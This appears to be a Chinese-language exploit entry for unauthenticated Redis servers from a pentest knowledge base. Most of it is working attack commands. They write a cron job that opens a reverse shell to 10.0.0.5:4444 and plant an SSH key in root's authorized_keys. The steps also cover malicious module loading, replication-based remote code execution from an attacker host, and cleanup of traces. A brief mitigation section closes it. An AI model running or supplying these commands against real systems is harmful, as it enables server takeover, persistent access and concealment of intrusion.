---
title: Redis 未授权（写文件 / 模块加载 / 主从复制）
cve: 无单一 CVE（CVE-2022-0543 为 Debian 特例）
severity: critical
cvss: 9.8
product: Redis
versions: 任意（无认证 + 暴露）
ports: 6379, 6380
keywords: redis, unauth, config-set, rdb, cron, module-load, replica
verified: false
sources: 公开资料整理（业务逻辑 / 实现 / 配置缺陷类，无 CVE；出处见文末参考）
---

## 指纹

```bash
redis-cli -h target -p 6379 INFO
redis-cli -h target -p 6379 CONFIG GET dir
```

返回 `redis_version` 即未授权。

## 前置条件

- 6379 可达且 `requirepass` 为空；Redis 进程用户对目标目录可写。

## PoC

```bash
# 1) 判定
redis-cli -h target CONFIG GET dir
redis-cli -h target CONFIG GET dbfilename

# 2) 写 crontab（Linux）
redis-cli -h target CONFIG SET dir /var/spool/cron/
redis-cli -h target CONFIG SET dbfilename root
redis-cli -h target SET x "\n\n*/1 * * * * bash -i >& /dev/tcp/10.0.0.5/4444 0>&1\n\n"
redis-cli -h target SAVE

# 3) 写 SSH key
redis-cli -h target CONFIG SET dir /root/.ssh/
redis-cli -h target CONFIG SET dbfilename authorized_keys
redis-cli -h target SET x "\n\nssh-rsa AAAA... \n\n"
redis-cli -h target SAVE
```

## 利用步骤

1. `INFO` 确认版本与 `CONFIG` 可用（部分版本禁用 `CONFIG` 时走 `SLAVEOF`/`MODULE`）。
2. 写文件前先 `CONFIG GET dir` 确认可写目录；`SAVE` 后验证文件（`redis-cli GET` 或直接读）。
3. Windows 目标：写 `C:\Windows\Temp\` 下的启动项或 `C:\Users\<u>\.ssh\authorized_keys`。
4. 加载模块（4.x+）：`MODULE LOAD /path/exp.so` → `system.exec 'id'`（RedisModules-ExecuteCommand）。
5. 主从复制 RCE：`SLAVEOF attacker 6379` + `MODULE LOAD`，在不出网写文件受限时最稳。
6. 清理：`CONFIG SET dir /tmp` 恢复、删写入的文件、`MODULE UNLOAD`。

## 修复与缓解

- 设 `requirepass` + `rename-command CONFIG ""`；6379 只对内网；`protected-mode yes` 且不绑 0.0.0.0。

## 参考

- Redis 安全建议；CVE-2022-0543（Debian 打包的 Lua 沙箱逃逸）。
